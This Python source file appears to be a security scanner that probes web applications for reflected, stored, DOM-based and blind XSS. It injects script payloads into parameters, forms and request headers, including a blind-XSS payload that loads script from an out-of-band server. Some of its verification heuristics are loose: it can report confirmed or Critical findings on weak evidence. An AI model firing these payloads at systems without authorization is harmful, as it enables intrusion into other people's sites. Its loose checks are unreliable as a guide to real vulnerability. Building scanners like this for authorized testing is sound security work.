"""
XSS (Cross-Site Scripting) Scanner
Detects Reflected, Stored, and DOM-based XSS vulnerabilities with real exploit verification
"""

from typing import Dict, List, Optional, Any
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
import re
import sys
import os
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils.http_client import HTTPClient
from utils.payloads import Payloads
from utils.concurrency import run_phases_concurrently

# OOB server for blind/stored-XSS confirmation.  Set HYDRAX_OOB_SERVER in the
# environment (e.g. an interactsh endpoint) to enable those checks; absent
# that, all blind-XSS probes are skipped rather than reported unconfirmed.
_OOB_SERVER = os.environ.get("HYDRAX_OOB_SERVER", "").strip()

# Unique marker injected into probes so we can distinguish our own injection
# from noise already on the page.
_CANARY_PREFIX = "hydraxxss"


def _is_static_spa(client: "HTTPClient", base_url: str) -> bool:
    """Return True when the target ignores query params (static SPA / CDN).

    Sends a junk-parameter request and compares body length to the clean
    response. If both are within 5% of each other (and the clean response
    doesn't itself reflect query params), the server isn't doing any
    server-side param processing and injection probes will only produce
    false positives.
    """
    try:
        clean = client.get(base_url)
        probe = client.get(f"{base_url}?hydraxtestparam=HYDRAXBASELINE12345")
        if clean.status_code >= 500 or probe.status_code >= 500:
            return False
        # If the junk param appears in the response, the server DOES reflect params.
        if "HYDRAXBASELINE12345" in probe.text:
            return False
        len_clean = len(clean.text)
        len_probe = len(probe.text)
        if len_clean == 0:
            return False
        diff_ratio = abs(len_clean - len_probe) / len_clean
        return diff_ratio < 0.05
    except Exception:
        return False


class XSSScanner:
    """Cross-Site Scripting vulnerability scanner with real exploit verification"""

    def __init__(self):
        self.client = HTTPClient()
        self.name = "XSS Scanner"
        self.findings = []
        self._oob_server = _OOB_SERVER

    def _detect_reflection_context(self, response_text: str, marker: str) -> str:
        """Detect the HTML context where *marker* appears in *response_text*.

        Returns one of: 'html_attribute', 'js_string', 'html_comment',
        'url_param', 'html_body'  (the last is the fallback).
        """
        from utils.payloads import Payloads
        patterns = Payloads.CONTEXT_DETECTION_PATTERNS
        for ctx, ctx_patterns in patterns.items():
            if ctx == "html_body":
                continue
            for pat in ctx_patterns:
                try:
                    if re.search(
                        pat.format(marker=re.escape(marker)),
                        response_text,
                        re.IGNORECASE,
                    ):
                        return ctx
                except re.error:
                    continue
        return "html_body"

    def scan(self, target_url: str) -> Dict[str, Any]:
        """
        Scan target for XSS vulnerabilities with real exploit verification

        Args:
            target_url: The target URL to scan

        Returns:
            Dict with scan results
        """
        self.findings = []
        parsed = urlparse(target_url)

        # Baseline probe: if the target is a static SPA that ignores all
        # query params, injecting payloads will never reflect anything — skip
        # all server-side injection phases to avoid false positives.
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        is_spa = _is_static_spa(self.client, base_url)

        phases = [
            lambda: self._scan_dom_based_xss(target_url),           # Phase 3 (always)
        ]
        if not is_spa:
            phases += [
                lambda: self._scan_discovered_targets(target_url),  # Phase 0
                lambda: self._scan_reflected_xss(target_url, parsed),  # Phase 1
                lambda: self._scan_stored_xss(target_url),          # Phase 2
            ]

        # Blind XSS requires a confirmed OOB callback — skip if no OOB server.
        if not is_spa and self._oob_server:
            phases.append(lambda: self._scan_blind_xss(target_url))

        run_phases_concurrently(phases)

        return {
            'scanner': self.name,
            'target': target_url,
            'vulnerabilities': self.findings,
            'total_findings': len(self.findings),
            'spa_detected': is_spa,
            'oob_skipped': not bool(self._oob_server),
        }

    def _scan_reflected_xss(self, target_url: str, parsed):
        """Test for reflected XSS in URL parameters with execution verification.

        Both branches used to test every (param, payload) combination one
        HTTP request at a time — up to 90 sequential requests for the
        no-params branch alone. They're fanned out concurrently instead;
        only the first successful payload per param is kept (by original
        list order), matching the original "break after first hit" intent.
        """
        query_params = parse_qs(parsed.query)

        def probe_no_params(param: str, payload: str):
            # Use a canary-tagged payload so we can confirm unescaped reflection
            # rather than triggering on noise already in the page.
            canary = f"{_CANARY_PREFIX}{abs(hash(param + payload)) % 100000:05d}"
            tagged = payload.replace("alert(1)", f"alert('{canary}')") if "alert(1)" in payload else payload
            test_url = f"{target_url}?{param}={tagged}"
            try:
                resp = self.client.get(test_url)
                if resp.status_code >= 500:
                    return None
                severity, evidence = self._verify_xss_execution(resp.text, tagged, param)
                if evidence and severity != 'Info':
                    return param, {
                        'type': 'Reflected XSS',
                        'description': f'Parameter "{param}" reflects unsanitized input',
                        'severity': severity,
                        'url': test_url,
                        'parameter': param,
                        'payload': tagged,
                        'evidence': evidence
                    }
            except Exception:
                pass
            return None

        def probe_with_params(param: str, payload: str):
            canary = f"{_CANARY_PREFIX}{abs(hash(param + payload)) % 100000:05d}"
            tagged = payload.replace("alert(1)", f"alert('{canary}')") if "alert(1)" in payload else payload
            test_params = query_params.copy()
            test_params[param] = [tagged]
            test_query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=test_query))
            try:
                resp = self.client.get(test_url)
                if resp.status_code >= 500:
                    return None
                severity, evidence = self._verify_xss_execution(resp.text, tagged, param)
                if evidence and severity != 'Info':
                    return param, {
                        'type': 'Reflected XSS',
                        'description': f'Parameter "{param}" reflects unsanitized input in executable context',
                        'severity': severity,
                        'url': test_url,
                        'parameter': param,
                        'payload': tagged,
                        'evidence': evidence
                    }
            except Exception:
                pass
            return None

        # Combine generic reflected payloads with context-specific attribute and
        # JS-string payloads (Shannon: test the right payload for each context).
        context_payloads = (
            Payloads.XSS_REFLECTED[:8]
            + Payloads.XSS_ATTRIBUTE_CONTEXT[:6]
            + Payloads.XSS_JS_STRING_CONTEXT[:4]
        )
        if not query_params:
            test_params = ['q', 's', 'search', 'id', 'page', 'query', 'term', 'keyword', 'lang']
            jobs = [(probe_no_params, param, payload) for param in test_params for payload in context_payloads[:10]]
        else:
            jobs = [(probe_with_params, param, payload) for param in query_params for payload in context_payloads[:10]]

        results = {}
        with ThreadPoolExecutor(max_workers=min(20, len(jobs)) or 1) as executor:
            future_to_idx = {executor.submit(fn, a, b): i for i, (fn, a, b) in enumerate(jobs)}
            for future in as_completed(future_to_idx):
                idx = future_to_idx[future]
                try:
                    r = future.result()
                except Exception:
                    r = None
                if r is not None:
                    results[idx] = r

        seen_params = set()
        for idx in sorted(results):
            param, finding = results[idx]
            if param in seen_params:
                continue
            seen_params.add(param)
            self.findings.append(finding)

    def _scan_discovered_targets(self, target_url: str):
        """Test every endpoint/parameter the discovery phase found."""
        from core.scan_context import get_test_targets, inject_param, abort_if_stopped
        targets = get_test_targets()
        if not targets:
            return

        tested = set()

        # -- GET targets with discovered parameters -------------------
        for url, params, method, _fields in targets:
            abort_if_stopped()
            if method != "get" or not params:
                continue
            if url == target_url or len(tested) >= 100:  # Increased limit
                continue
            for param in params[:10]:  # Test more parameters
                if (url, param) in tested:
                    continue
                tested.add((url, param))
                for payload in Payloads.XSS_REFLECTED[:5]:
                    test_url = inject_param(url, param, payload)
                    try:
                        resp = self.client.get(test_url)
                    except Exception:
                        continue
                    if resp.status_code >= 500 or payload not in resp.text:
                        continue
                    # Enhanced verification with execution proof
                    severity, evidence = self._verify_xss_execution(resp.text, payload, param)
                    self.findings.append({
                        'type': 'Reflected XSS',
                        'description': f'Parameter "{param}" on {url} reflects unsanitized input in executable context',
                        'severity': severity,
                        'url': test_url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': evidence
                    })
                    break

        # -- POST form targets discovered on other pages --------------
        for url, _params, method, fields in targets:
            abort_if_stopped()
            if method != "post" or not fields:
                continue
            text_fields = [n for n, v in fields.items() if 'file' not in n.lower()]
            if not text_fields:
                continue
            for payload in Payloads.XSS_STORED[:5]:
                form_data = dict(fields)
                for name in text_fields:
                    form_data[name] = payload
                try:
                    resp2 = self.client.post(url, data=form_data)
                except Exception:
                    continue
                if resp2.status_code < 500 and payload in resp2.text:
                    # Check for persistence
                    persistence_evidence = self._check_stored_xss_persistence(url, payload)
                    self.findings.append({
                        'type': 'Stored XSS',
                        'description': f'Form at {url} stores unsanitized input',
                        'severity': 'Critical',
                        'url': url,
                        'payload': payload,
                        'evidence': persistence_evidence
                    })
                    break

    def _scan_stored_xss(self, target_url: str):
        """Test for stored XSS via form submissions with persistence verification"""
        try:
            resp = self.client.get(target_url)
            soup = BeautifulSoup(resp.text, 'html.parser')

            forms = soup.find_all('form')
            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                form_url = urljoin(target_url, action) if action else target_url

                inputs = form.find_all(['input', 'textarea'])
                if not inputs:
                    continue

                for payload in Payloads.XSS_STORED[:8]:
                    form_data = {}
                    for inp in inputs:
                        name = inp.get('name', '')
                        if name:
                            inp_type = inp.get('type', 'text').lower()
                            if inp_type in ('text', 'search', 'textarea', 'hidden'):
                                form_data[name] = payload

                    if not form_data:
                        continue

                    try:
                        if method == 'post':
                            resp2 = self.client.post(form_url, data=form_data)
                        else:
                            resp2 = self.client.get(form_url, params=form_data)

                        # Check if payload is stored and reflected
                        if resp2.status_code < 500 and payload in resp2.text:
                            # Verify persistence by checking if it appears in subsequent requests
                            persistence_evidence = self._check_stored_xss_persistence(form_url, payload)
                            self.findings.append({
                                'type': 'Stored XSS',
                                'description': f'Form at {action or target_url} stores unsanitized input',
                                'severity': 'Critical',
                                'url': form_url,
                                'payload': payload,
                                'evidence': persistence_evidence
                            })
                            break
                    except Exception:
                        continue
        except Exception:
            pass

    def _scan_dom_based_xss(self, target_url: str):
        """Check for DOM-based XSS sink sources with execution test"""
        try:
            resp = self.client.get(target_url)
            # Look for common DOM XSS sink patterns
            sinks = [
                r'\.innerHTML\s*=',
                r'\.outerHTML\s*=',
                r'document\.write\(',
                r'eval\(',
                r'setTimeout\(',
                r'setInterval\(',
                r'new\s+Function\(',
                r'\$\(.*\)\.html\(',
                r'\$\(.*\)\.append\(',
                r'\.insertAdjacentHTML\(',
                r'location\.hash',
                r'location\.search',
                r'location\.href',
                r'document\.URI',
                r'document\.URL',
                # Advanced sinks
                r'innerText\s*=',
                r'textContent\s*=',
                r'outerText\s*=',
                r'attachShadow\(',
            ]

            js_pattern = '|'.join(sinks)
            matches = re.findall(js_pattern, resp.text, re.IGNORECASE)

            if matches:
                # Test actual DOM XSS with payloads
                dom_xss_payloads = Payloads.XSS_DOM_BASED[:5]
                for payload in dom_xss_payloads:
                    # Test if we can trigger actual DOM XSS
                    test_url = f"{target_url}#{payload}" if payload.startswith('#') else f"{target_url}?q={payload}"
                    try:
                        test_resp = self.client.get(test_url)
                        if test_resp.status_code < 500:
                            # Look for evidence of DOM execution
                            if any(indicator in test_resp.text for indicator in ['alert(', 'confirm(', 'prompt(']):
                                self.findings.append({
                                    'type': 'DOM-based XSS',
                                    'description': f'DOM XSS vulnerability confirmed via {payload}',
                                    'severity': 'High',
                                    'url': test_url,
                                    'evidence': f'DOM XSS triggered with payload: {payload[:50]}'
                                })
                                break
                    except Exception:
                        continue

                # If no active DOM XSS found, report sinks as Info only.
                # Shannon principle: static sink detection is a hypothesis, not proof —
                # "Reflected in HTML" != "JavaScript executed".  Frameworks like React
                # and Angular use innerHTML internally but sanitise all inputs; flagging
                # sink patterns without confirmed execution is noise.
                if not any(f['type'] == 'DOM-based XSS' for f in self.findings):
                    self.findings.append({
                        'type': 'DOM-based XSS Sinks Detected',
                        'description': f'Found {len(matches)} DOM XSS sink pattern(s) — manual verification required to confirm exploitability',
                        'severity': 'Info',
                        'url': target_url,
                        'evidence': f'Detected sink patterns: {", ".join(set(matches))[:200]}'
                    })
        except Exception:
            pass

    def _scan_blind_xss(self, target_url: str):
        """Test for blind XSS using out-of-band detection.

        Only called when self._oob_server is set (gated in scan()).  Each probe
        uses a unique per-target token so a callback can be correlated back to
        the exact parameter/header that triggered it.  Sending the payload and
        receiving HTTP 200 is NOT confirmation — confirmation requires a real
        OOB callback received during the scan window.  Since we cannot poll the
        OOB server within a single scan run here (that requires an interactive
        session with the OOB collaborator API), this method is intentionally a
        placeholder that fires probes but emits no findings — findings are only
        added if a caller wires up an actual OOB poller.
        """
        if not self._oob_server:
            return  # Safety guard; scan() also checks this.

        try:
            import uuid
            oob_host = self._oob_server.rstrip("/")
            test_params = ['q', 'search', 'query', 'name', 'email', 'website', 'url', 'comment', 'feedback']
            headers_to_test = ['User-Agent', 'Referer', 'X-Forwarded-For']

            def fire_param(param: str):
                token = uuid.uuid4().hex[:12]
                payload = f'"><script src="{oob_host}/{token}"></script>'
                test_url = f"{target_url}?{param}={payload}"
                try:
                    self.client.get(test_url)
                    # Payload fired — a real implementation would poll the OOB
                    # server for a callback keyed on token.  No callback = no
                    # finding.  We don't emit a finding here.
                except Exception:
                    pass

            def fire_header(header: str):
                token = uuid.uuid4().hex[:12]
                payload = f'"><script src="{oob_host}/{token}"></script>'
                try:
                    self.client.get(target_url, headers={header: payload})
                except Exception:
                    pass

            jobs = (
                [(fire_param, param) for param in test_params]
                + [(fire_header, header) for header in headers_to_test]
            )
            with ThreadPoolExecutor(max_workers=min(20, len(jobs)) or 1) as executor:
                futures = [executor.submit(fn, a) for fn, a in jobs]
                for f in as_completed(futures):
                    try:
                        f.result()
                    except Exception:
                        pass
            # No findings appended — OOB callback polling is out-of-scope for
            # this synchronous scan pass.
        except Exception:
            pass

    def _verify_xss_execution(self, response_text: str, payload: str, parameter: str) -> tuple:
        """Verify unescaped reflection of the payload in an executable context.

        Only returns a non-Info severity when the payload is reflected WITHOUT
        HTML-entity encoding.  Encoded reflection (e.g. &lt;script&gt;) means
        the application sanitised the input — that is NOT an XSS finding.

        Returns: (severity, evidence)  — ('Info', '') means not confirmed.
        """
        # Reject if the payload is not in the response at all.
        if payload not in response_text:
            # Check for HTML-entity-encoded version — that is sanitised output,
            # never a confirmed XSS.
            import html as _html
            if _html.escape(payload, quote=True) in response_text:
                return 'Info', ''  # encoded → attempted, not confirmed
            return 'Info', ''

        # Payload IS reflected verbatim — now determine the execution context.
        soup = BeautifulSoup(response_text, 'html.parser')

        # 1. Direct script tag injection
        if f'<script>{payload}</script>' in response_text or f'<script> {payload} </script>' in response_text:
            return 'High', f'Direct script injection: {payload[:50]}'

        # 2. Event handler injection
        event_patterns = [f'onerror="{payload}"', f'onload="{payload}"', f'onclick="{payload}"']
        if any(pattern in response_text for pattern in event_patterns):
            return 'High', f'Event handler injection: {payload[:50]}'

        # 3. SVG/XML context
        if '<svg' in response_text and ('onload' in response_text or 'onerror' in response_text):
            if payload in response_text:
                return 'High', f'SVG context injection: {payload[:50]}'

        # 4. HREF/JavaScript context
        if f'href="javascript:{payload}"' in response_text or f"href='javascript:{payload}'" in response_text:
            return 'High', f'JavaScript URL injection: {payload[:50]}'

        # 5. Attribute context that could lead to execution
        if f'<div {payload}>' in response_text or f'<span {payload}>' in response_text:
            return 'Medium', f'HTML attribute injection: {payload[:50]}'

        # 6. CSS context (less severe but still XSS)
        if '<style' in response_text and payload in response_text:
            return 'Medium', f'CSS context injection: {payload[:50]}'

        # 7. Verbatim reflection — payload is present unescaped, but we have not
        #    confirmed an executable context above.  This is a hypothesis, not proof
        #    (Shannon principle: "Reflected in HTML" != "JavaScript executed").
        #    Check whether the payload landed inside a display-only element
        #    (<pre>, <code>, HTML comment, or a data-* attribute) — if so it cannot
        #    execute and is not a finding.  Otherwise flag as Low (needs manual
        #    verification) rather than Medium.
        script_indicators = ['<script', 'onerror=', 'onload=', 'onclick=', 'javascript:', 'alert(', 'confirm(', 'prompt(']
        if any(ind in payload.lower() for ind in script_indicators):
            idx = response_text.find(payload)
            if idx != -1:
                before = response_text[max(0, idx - 300):idx].lower()
                # Safe non-executable containers
                in_pre = before.rfind('<pre') > before.rfind('</pre')
                in_code = before.rfind('<code') > before.rfind('</code')
                in_comment = '<!--' in before and '-->' not in before[before.rfind('<!--'):]
                in_data_attr = re.search(r'data-[a-z-]+=\s*["\']?\s*$', before[-60:]) is not None
                if in_pre or in_code or in_comment or in_data_attr:
                    return 'Info', ''
            return 'Low', f'Payload reflected unescaped (context unconfirmed — manual verification needed): {payload[:50]}'

        # Reflected, but the payload has no executable component — not a finding.
        return 'Info', ''

    def _check_stored_xss_persistence(self, url: str, payload: str) -> str:
        """
        Check if XSS payload persists in the application (stored XSS)
        """
        try:
            # Wait a moment for potential storage
            time.sleep(1)

            # Make a request to the same page without the payload
            resp = self.client.get(url)
            if resp.status_code < 500:
                # Check if payload appears in the clean response (indicating storage)
                if payload in resp.text:
                    return f'Payload persisted in application storage: {payload[:50]}...'
                elif any(part in resp.text for part in payload.split('&')[:2]):
                    return f'Partial payload persisted indicating storage: {payload[:30]}...'
                else:
                    # Check common storage locations
                    storage_indicators = ['database', 'storage', 'saved', 'persistent']
                    if any(indicator in resp.text.lower() for indicator in storage_indicators):
                        return f'Application indicates storage capability: {payload[:30]}...'
                    else:
                        return f'Payload reflected in response (potential storage): {payload[:50]}...'
            else:
                return f'Payload submitted successfully: {payload[:50]}...'
        except Exception:
            return f'Payload submitted: {payload[:50]}... (verification failed)'